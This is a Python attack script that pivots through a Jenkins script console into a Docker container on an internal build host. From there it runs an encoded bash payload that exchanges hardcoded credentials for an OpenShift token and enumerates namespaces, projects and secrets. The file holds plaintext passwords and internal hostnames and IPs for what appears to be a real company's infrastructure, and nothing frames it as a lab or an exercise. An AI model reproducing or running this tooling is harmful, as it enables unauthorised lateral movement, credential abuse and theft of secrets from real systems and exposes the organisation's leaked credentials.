import urllib.request, base64, json, urllib.parse, ssl, http.cookiejar

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

AUTH = base64.b64encode(b'eduardo.cruz:xwMyIxfkZZaDNkFg').decode()
BASE = 'https://jenkins-ng.dev.claroshop.com'

def jenkins_exec(script):
    cj = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=ctx)
    )
    req = urllib.request.Request(BASE + '/crumbIssuer/api/json',
                                 headers={'Authorization': 'Basic ' + AUTH})
    crumb = json.loads(opener.open(req, timeout=15).read().decode())
    data = urllib.parse.urlencode({'script': script}).encode()
    req2 = urllib.request.Request(BASE + '/scriptText', data=data,
                                  headers={'Authorization': 'Basic ' + AUTH,
                                           crumb['crumbRequestField']: crumb['crumb']})
    return opener.open(req2, timeout=180).read().decode()


# Inner script runs INSIDE pivot03 on build host CSDEVBLD01-1 (172.27.140.148).
# Base64'd in Python -> zero escaping issues through Groovy/JSON layers.
INNER = r'''#!/bin/bash
echo "[*] pivot03: $(id -un)@$(hostname)"
which curl >/dev/null 2>&1 && echo '[*] curl OK' || echo '[!] NO curl'
echo '[*] OCP healthz from build host:'
curl -sk --max-time 8 https://console.dev.amxnova.net:8443/healthz
echo " HEALTHZ_EXIT=$?"
echo '[*] token exchange (cs-jenkins-deployer):'
HDRS=$(curl -sk --max-time 12 -u 'cs-jenkins-deployer:auroraboreal00' -H 'X-CSRF-Token: 1' 'https://console.dev.amxnova.net:8443/oauth/authorize?response_type=token&client_id=openshift-challenging-client' -D - -o /dev/null)
echo "$HDRS" | head -6
TOKEN=$(echo "$HDRS" | sed -n 's/.*access_token=\([^&]*\).*/\1/p' | head -1)
echo "TOKEN_LEN=${#TOKEN}"
if [ -n "$TOKEN" ]; then
  echo '[*] === /api/v1/namespaces ==='
  curl -sk --max-time 12 -H "Authorization: Bearer $TOKEN" 'https://console.dev.amxnova.net:8443/api/v1/namespaces' | head -c 3500
  echo ''
  echo '[*] === /oapi/v1/projects ==='
  curl -sk --max-time 12 -H "Authorization: Bearer $TOKEN" 'https://console.dev.amxnova.net:8443/oapi/v1/projects' | head -c 2000
  echo ''
  echo '[*] === secrets in mrc-cs-tienda-0001 (names only) ==='
  curl -sk --max-time 12 -H "Authorization: Bearer $TOKEN" 'https://console.dev.amxnova.net:8443/api/v1/namespaces/mrc-cs-tienda-0001/secrets' | head -c 3500
fi
echo '[*] DONE'
'''

B64 = base64.b64encode(INNER.encode()).decode()

GROOVY = r'''import groovy.json.JsonSlurper

def dapi = 'http://172.27.140.148:4243'
def b64 = '__B64__'

def httpPost = { String url, String body, int readTo ->
    def c = new URL(url).openConnection()
    c.setRequestMethod('POST')
    c.setDoOutput(true)
    c.setConnectTimeout(15000)
    c.setReadTimeout(readTo)
    c.setRequestProperty('Content-Type', 'application/json')
    c.outputStream.write(body.getBytes('UTF-8'))
    c.outputStream.flush()
    return c
}

// 0. ensure pivot03 running
def insp = new URL(dapi + '/containers/pivot03/json').openConnection()
insp.setConnectTimeout(10000); insp.setReadTimeout(10000)
def info = new JsonSlurper().parse(insp.inputStream)
println "pivot03 running=${info.State.Running} startedAt=${info.State.StartedAt}"
if (!info.State.Running) {
    def st = httpPost(dapi + '/containers/pivot03/start', '', 15000)
    println "start code=${st.responseCode}"
}

// 1. exec create
def payload = '{"AttachStdout":true,"AttachStderr":true,"Cmd":["bash","-c","echo ' + b64 + ' | base64 -d > /tmp/ocp_t.sh && bash /tmp/ocp_t.sh 2>&1"]}'
def ec = httpPost(dapi + '/containers/pivot03/exec', payload, 20000)
def execResp = new JsonSlurper().parse(ec.inputStream)
println "execId=${execResp.Id}"

// 2. exec start (hijacked raw stream)
def es = httpPost(dapi + '/exec/' + execResp.Id + '/start', '{"Detach":false,"Tty":false}', 120000)
try {
    println es.inputStream.getText('UTF-8')
} catch (e) {
    println "read err (may be timeout): ${e.message}"
}
'''

if __name__ == '__main__':
    script = GROOVY.replace('__B64__', B64)
    print('=' * 80)
    print('[*] TASK: pivot03 exec -> OCP token exchange + namespaces + secrets')
    print('=' * 80)
    try:
        print(jenkins_exec(script))
    except Exception as e:
        print('[-] ERROR: {}'.format(e))
